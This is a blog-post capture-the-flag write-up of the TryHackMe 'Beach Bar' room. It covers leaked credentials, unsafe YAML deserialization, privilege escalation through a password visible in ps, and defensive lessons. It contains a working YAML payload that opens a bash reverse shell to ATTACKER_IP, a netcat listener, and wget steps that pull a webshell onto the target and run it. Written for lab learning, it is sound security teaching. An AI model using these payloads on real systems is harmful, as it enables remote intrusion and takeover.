@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Hacker Holidays 2026 — Beach Bar Writeup — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="Complete walkthrough of the Beach Bar Boot2Root room covering source code reconnaissance, YAML deserialization leading to RCE, reverse shell access, process enumeration, and Linux privilege escalation.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-hacker-holidays-2026-beach-bar-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Hacker Holidays 2026 — Beach Bar Writeup">
+  <meta property="og:description" content="Complete walkthrough of the Beach Bar Boot2Root room covering source code reconnaissance, YAML deserialization leading to RCE, reverse shell access, process enumeration, and Linux privilege escalation.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-hacker-holidays-2026-beach-bar-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-01-08T00:00:00.000Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+  <meta property="article:tag" content="linux">
+  <meta property="article:tag" content="attack-techniques">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Hacker Holidays 2026 — Beach Bar Writeup">
+  <meta name="twitter:description" content="Complete walkthrough of the Beach Bar Boot2Root room covering source code reconnaissance, YAML deserialization leading to RCE, reverse shell access, process enumeration, and Linux privilege escalation.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Hacker Holidays 2026 — Beach Bar Writeup","description":"Complete walkthrough of the Beach Bar Boot2Root room covering source code reconnaissance, YAML deserialization leading to RCE, reverse shell access, process enumeration, and Linux privilege escalation.","datePublished":"2026-01-08T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-hacker-holidays-2026-beach-bar-writeup/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation, linux, attack-techniques"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-tryhackme-hacker-holidays-2026-beach-bar-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Hacker Holidays 2026 — Beach Bar Writeup</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 01-08-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span><span class="card-cat-chip">linux</span><span class="card-cat-chip">attack-techniques</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<p><strong>Room:</strong> Beach Bar<br><strong>Category:</strong> Boot2Root<br><strong>Difficulty:</strong> Easy<br><strong>Room URL:</strong> <a href="https://tryhackme.com/room/hh-beachbar-d849f7f7">https://tryhackme.com/room/hh-beachbar-d849f7f7</a></p>
+<hr>
+<h2>Scenario</h2>
+<p>The Beach Bar at the Byte Lotus Hotel offers more than drinks and music. A web-based jukebox application has been deployed in a hurry, and several insecure development practices have made their way into production.</p>
+<p>Your objective is to obtain initial access, retrieve the user flag, escalate privileges, and capture the root flag.</p>
+<hr>
+<h1>Enumeration</h1>
+<p>After deploying the machine, visit the target.</p>
+<pre><code class="language-text">http://MACHINE_IP
+</code></pre>
+<p>In my case:</p>
+<pre><code class="language-text">http://10.49.191.252/
+</code></pre>
+<p>The application immediately redirects to a login page.</p>
+<img width="1350" height="835" alt="Screenshot 2026-08-01 182524" src="https://github.com/user-attachments/assets/7b36f066-00b8-4640-bf12-3e70adf6c32c" />
+
+
+<blockquote>
+<p>Login Page</p>
+</blockquote>
+<hr>
+<h2>Source Code Review</h2>
+<p>Whenever a login page is encountered during a CTF, checking the HTML source is always worth doing.</p>
+<p>Viewing the page source revealed an interesting developer comment containing the application&#39;s credentials.</p>
+<img width="655" height="328" alt="Screenshot 2026-08-01 182542" src="https://github.com/user-attachments/assets/f3c3a1e0-cb80-4319-91ce-c12551d76adc" />
+
+<blockquote>
+<p>HTML Source Comment</p>
+</blockquote>
+<p>Credentials discovered:</p>
+<pre><code class="language-text">Username: dj
+Password: dj
+</code></pre>
+<p>This is an example of <strong>sensitive information disclosure</strong>, where developers accidentally leave debugging comments or credentials inside production code.</p>
+<p><strong>MITRE ATT&amp;CK</strong></p>
+<ul>
+<li>T1552 - Unsecured Credentials</li>
+</ul>
+<hr>
+<h1>Dashboard</h1>
+<p>After authenticating, the dashboard becomes accessible.</p>
+<img width="1348" height="864" alt="Screenshot 2026-08-01 182645" src="https://github.com/user-attachments/assets/5314733c-78b6-4966-ab4f-67b749b2552e" />
+
+
+<blockquote>
+<p>Dashboard</p>
+</blockquote>
+<p>Several features are available, including:</p>
+<ul>
+<li>Export Playlist</li>
+<li>Import Playlist</li>
+</ul>
+<p>The Export function downloads a YAML file.</p>
+<img width="633" height="236" alt="Screenshot 2026-08-01 182706" src="https://github.com/user-attachments/assets/0c936c8c-85a0-4cc9-962f-095d065b5319" />
+
+
+<blockquote>
+<p>Exported YAML File</p>
+</blockquote>
+<hr>
+<h2>Inspecting the YAML</h2>
+<p>The downloaded playlist looked similar to:</p>
+<pre><code class="language-yaml">playlist:
+  name: Summer Mix
+  vibe: golden hour
+  tracks:
+    - Song 1
+    - Song 2
+</code></pre>
+<img width="712" height="603" alt="Screenshot 2026-08-01 182720" src="https://github.com/user-attachments/assets/56820777-1c33-4bf4-a711-924cdbbfe155" />
+
+
+<blockquote>
+<p>YAML Content</p>
+</blockquote>
+<p>The presence of YAML immediately suggested checking whether the application was using an unsafe YAML deserializer.</p>
+<hr>
+<h1>Discovering YAML Injection</h1>
+<p>After testing various payloads, it became clear that the <strong>Import Playlist</strong> feature was vulnerable to <strong>unsafe YAML deserialization</strong>.</p>
+<p>Instead of treating YAML as plain data, the backend allowed Python objects to be constructed during parsing.</p>
+<p>This enables arbitrary code execution.</p>
+<hr>
+<h1>Exploiting YAML Deserialization</h1>
+<p>The following payload spawns a reverse shell using Python.</p>
+<pre><code class="language-yaml">playlist:
+  name: !!python/object/apply:subprocess.Popen [[&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;]]
+  vibe: golden hour
+  tracks: []
+</code></pre>
+<p>Replace:</p>
+<pre><code class="language-text">ATTACKER_IP
+</code></pre>
+<p>with your own attacker IP.</p>
+<p>Paste the payload into the Import page.</p>
+<img width="847" height="709" alt="Screenshot 2026-08-01 183218" src="https://github.com/user-attachments/assets/81faa8d6-cfef-46dc-873a-b5f489da0e4a" />
+
+
+<blockquote>
+<p>Import Page</p>
+</blockquote>
+<hr>
+<h2>Listener</h2>
+<p>Start a Netcat listener.</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<p>Once <strong>Load Playlist</strong> is clicked, the application deserializes the malicious object and executes the command.</p>
+<p>A reverse shell is obtained.</p>
+<img width="1267" height="857" alt="Screenshot 2026-08-01 183234" src="https://github.com/user-attachments/assets/f55ba2b8-bb31-4a79-bc0e-07e1c3616f05" />
+
+<blockquote>
+<p>Reverse Shell</p>
+</blockquote>
+<hr>
+<h1>Improving Shell Stability</h1>
+<p>One issue commonly encountered during CTFs is unstable reverse shells.</p>
+<p>If the shell freezes or disconnects unexpectedly, retriggering the exploit is not always possible. Some intentionally vulnerable applications only execute the payload once, or the service may crash after exploitation.</p>
+<p>To avoid losing access, I uploaded my own browser-based Python webshell.</p>
+<p>Project:</p>
+<p><a href="https://github.com/giriaryan694-a11y/Ary_WebShell_Py">https://github.com/giriaryan694-a11y/Ary_WebShell_Py</a></p>
+<p>Ary_WebShell_Py is a lightweight browser-based interactive terminal written in Python 3 for <strong>authorized CTF competitions and security research</strong>. It provides a persistent PTY-style interface through a web browser, making post-exploitation significantly more convenient.</p>
+<hr>
+<h2>Downloading the Webshell</h2>
+<p>Because the TryHackMe target cannot directly access the Internet, download the script on your attacker machine first.</p>
+<pre><code class="language-bash">wget https://github.com/giriaryan694-a11y/Ary_WebShell_Py/raw/refs/heads/main/ary_webshell.py
+</code></pre>
+<img width="671" height="511" alt="Screenshot 2026-08-01 183042" src="https://github.com/user-attachments/assets/4a6c9861-ddb3-49ed-8837-3e1bc3f32721" />
+
+<blockquote>
+<p>Downloading Webshell</p>
+</blockquote>
+<hr>
+<h2>Hosting the File</h2>
+<p>Start a temporary HTTP server.</p>
+<pre><code class="language-bash">python -m http.server
+</code></pre>
+<img width="641" height="198" alt="Screenshot 2026-08-01 183432" src="https://github.com/user-attachments/assets/2b002882-8208-43bd-9341-08d856c0491f" />
+
+<blockquote>
+<p>Python HTTP Server</p>
+</blockquote>
+<hr>
+<h2>Transfer to Target</h2>
+<p>Download the file from the victim.</p>
+<p>Example:</p>
+<pre><code class="language-bash">wget http://ATTACKER_IP:8000/ary_webshell.py
+</code></pre>
+<p>Run it.</p>
+<pre><code class="language-bash">python3 ary_webshell.py
+</code></pre>
+<img width="701" height="458" alt="Screenshot 2026-08-01 183443" src="https://github.com/user-attachments/assets/4ea4dad2-50cf-4732-b089-d4785be0b641" />
+
+<blockquote>
+<p>Running Webshell</p>
+</blockquote>
+<p>Open:</p>
+<pre><code class="language-text">http://TARGET_IP:8888/
+</code></pre>
+<p>Example:</p>
+<pre><code class="language-text">http://10.49.191.252:8888/
+</code></pre>
+<p>The Session Manager dashboard appears.</p>
+<img width="1340" height="826" alt="Screenshot 2026-08-01 183532" src="https://github.com/user-attachments/assets/53d09b58-fef3-4526-959f-46ae25b94b86" />
+
+<blockquote>
+<p>Session Manager</p>
+</blockquote>
+<p>Create a new session to obtain an interactive browser terminal.</p>
+<p>If one terminal freezes, simply create another session without needing to exploit the application again.</p>
+<p>This greatly simplifies post-exploitation during CTFs.</p>
+<hr>
+<h1>User Flag</h1>
+<p>With stable shell access established, navigate through the filesystem and locate the user flag.</p>
+<img width="1090" height="813" alt="Screenshot 2026-08-01 183719" src="https://github.com/user-attachments/assets/1375a3c9-6ebf-46cd-8239-36e7f4982624" />
+
+<blockquote>
+<p>User Flag</p>
+</blockquote>
+<hr>
+<h1>Privilege Escalation</h1>
+<p>The privilege escalation was surprisingly simple.</p>
+<p>List running processes.</p>
+<pre><code class="language-bash">ps aux
+</code></pre>
+<p>Among the processes, a Python script was running as <strong>root</strong>.</p>
+<p>More importantly, its command-line arguments exposed the root password in plaintext.</p>
+<img width="1651" height="44" alt="Screenshot 2026-08-01 183834" src="https://github.com/user-attachments/assets/70c0d3ae-3e5f-48f5-b60c-d4fd91d10a6d" />
+
+<blockquote>
+<p>ps aux Output</p>
+</blockquote>
+<p>(The password has been intentionally hidden in screenshots to respect TryHackMe room rules.)</p>
+<p>This represents an example of <strong>credential exposure through process arguments</strong>.</p>
+<p>Processes and their arguments are frequently visible to other local users unless properly protected.</p>
+<hr>
+<h2>Switching to Root</h2>
+<p>Use the exposed password.</p>
+<pre><code class="language-bash">su root
+</code></pre>
+<p>Enter the password recovered from the process list.</p>
+<p>A root shell is obtained.</p>
+<p>Navigate to the root user&#39;s directory.</p>
+<pre><code class="language-bash">cd /root
+cat root.txt
+</code></pre>
+<img width="850" height="538" alt="Screenshot 2026-08-01 184108" src="https://github.com/user-attachments/assets/219912c5-823e-4b4e-9545-d6280d26c12d" />
+
+
+<blockquote>
+<p>Root Flag</p>
+</blockquote>
+<hr>
+<h1>Attack Chain</h1>
+<pre><code class="language-text">Source Code Review
+        │
+        ▼
+Hardcoded Credentials
+        │
+        ▼
+Login
+        │
+        ▼
+Export YAML
+        │
+        ▼
+Unsafe YAML Deserialization
+        │
+        ▼
+Remote Code Execution
+        │
+        ▼
+Reverse Shell
+        │
+        ▼
+Process Enumeration
+        │
+        ▼
+Root Password Disclosure
+        │
+        ▼
+Privilege Escalation
+        │
+        ▼
+Root Flag
+</code></pre>
+<hr>
+<h1>MITRE ATT&amp;CK Mapping</h1>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Credential Discovery</td>
+<td>T1552 - Unsecured Credentials</td>
+</tr>
+<tr>
+<td>Exploitation</td>
+<td>T1190 - Exploit Public-Facing Application</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>T1059 - Command and Scripting Interpreter</td>
+</tr>
+<tr>
+<td>Remote Shell</td>
+<td>T1105 - Ingress Tool Transfer</td>
+</tr>
+<tr>
+<td>Process Discovery</td>
+<td>T1057 - Process Discovery</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>T1552 - Credentials in Process Arguments</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>Valid Accounts</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>Security Lessons</h1>
+<p>This room demonstrates several common mistakes developers make when rapidly shipping applications.</p>
+<h2>Never Leave Credentials in Source Code</h2>
+<p>HTML comments, JavaScript files, Git repositories, and configuration files should never contain usernames, passwords, API keys, or debugging notes.</p>
+<hr>
+<h2>Treat YAML as Untrusted Input</h2>
+<p>Unsafe YAML deserialization has resulted in multiple real-world Remote Code Execution vulnerabilities.</p>
+<p>Always use safe loaders.</p>
+<p>For Python:</p>
+<pre><code class="language-python">yaml.safe_load()
+</code></pre>
+<p>instead of</p>
+<pre><code class="language-python">yaml.load()
+</code></pre>
+<hr>
+<h2>Avoid Secrets in Command-Line Arguments</h2>
+<p>Passwords supplied through command-line arguments can often be viewed by any local user via:</p>
+<pre><code class="language-bash">ps
+</code></pre>
+<p>Sensitive information should instead be stored using environment variables, protected configuration files, or dedicated secret management solutions.</p>
+<hr>
+<h2>Secure File Import Features</h2>
+<p>Import functionality should validate:</p>
+<ul>
+<li>File type</li>
+<li>Schema</li>
+<li>Object types</li>
+<li>Data structure</li>
+</ul>
+<p>before processing user-supplied content.</p>
+<hr>
+<h1>What This Room Teaches</h1>
+<ul>
+<li>Source code reconnaissance</li>
+<li>Credential discovery</li>
+<li>YAML deserialization attacks</li>
+<li>Remote Code Execution</li>
+<li>Reverse shell generation</li>
+<li>Shell stabilization</li>
+<li>File transfer techniques</li>
+<li>Linux enumeration</li>
+<li>Process inspection</li>
+<li>Privilege escalation</li>
+<li>Credential exposure through running processes</li>
+</ul>
+<hr>
+<h1>Conclusion</h1>
+<p>Beach Bar is a beginner-friendly Boot2Root room that chains together multiple realistic weaknesses into a complete attack path. The room starts with simple source code inspection, progresses through unsafe YAML deserialization for remote code execution, and finishes with a classic Linux privilege escalation caused by exposed credentials in process arguments.</p>
+<p>It also highlights an important operational lesson during CTFs: maintaining reliable shell access. Uploading a lightweight browser-based webshell after initial compromise can save significant time when reverse shells become unstable, making post-exploitation much smoother in isolated lab environments.</p>
+<p>Although intentionally vulnerable, every issue demonstrated in this room has appeared in real-world applications in one form or another, making it an excellent exercise for understanding how seemingly minor mistakes can combine into full system compromise.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
